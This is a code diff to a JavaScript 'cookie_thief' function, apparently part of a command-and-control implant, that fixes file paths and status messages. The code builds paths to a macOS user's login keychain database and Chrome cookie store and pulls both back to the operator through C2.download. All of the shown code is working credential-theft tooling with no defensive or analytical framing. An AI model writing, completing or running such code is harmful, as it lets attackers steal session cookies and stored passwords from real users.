@@ -6,9 +6,9 @@ exports.cookie_thief = function(task, command, params){
     var username = "";
     let browser = "chrome";
     let homedir = "/Users/";
-    let keychainpath = "Library/Keychains/login.keychain-db";
-    let chromeCookieDir = "Library/Application Support/Google/Chrome/Default/Cookies";
-    let cookiedir = "Library/Application Support/Google/Chrome/Default/Cookies";
+    let keychainpath = "/Library/Keychains/login.keychain-db";
+    let chromeCookieDir = "/Library/Application Support/Google/Chrome/Default/Cookies";
+    let cookiedir = "/Library/Application Support/Google/Chrome/Default/Cookies";
 
     if(config.hasOwnProperty("password") && typeof config['password'] == 'string'){
         password = config['password'];
@@ -23,7 +23,7 @@ exports.cookie_thief = function(task, command, params){
     else {
         return {'user_output': "Must supply the username", "completed": true, "status": "error"};
     }
-    cookiepath = homedir + username + "/";
+    cookiepath = homedir + username;
 
     if(config.hasOwnProperty("browser") && typeof config['browser'] == 'string'){ browser = config['browser']; }
     if(browser == "chrome") {
@@ -34,18 +34,18 @@ exports.cookie_thief = function(task, command, params){
     try{
         cookieDL_status = C2.download(task, cookieDLPath);
     	  if(cookieDL_status.hasOwnProperty("file_id")){
-    	      cookieDL_status['user_output'] = "Finished Downloading";
+    	      cookieDL_status['user_output'] = "Finished Downloading Cookies";
         }
     }
     catch(error)  {
         return {'user_output': error.toString(), "completed": true, "status": "error"};
     }
 
-    keypath = homedir + username + "/" + keychainpath;
+    keypath = homedir + username + keychainpath;
     try{
         keyDL_status = C2.download(task, keypath);
     	  if(keyDL_status.hasOwnProperty("file_id")){
-    	      keyDL_status['user_output'] = "Finished Downloading";
+    	      keyDL_status['user_output'] = "Finished Downloading KeychainDB";
         }
     }
     catch(error)  {
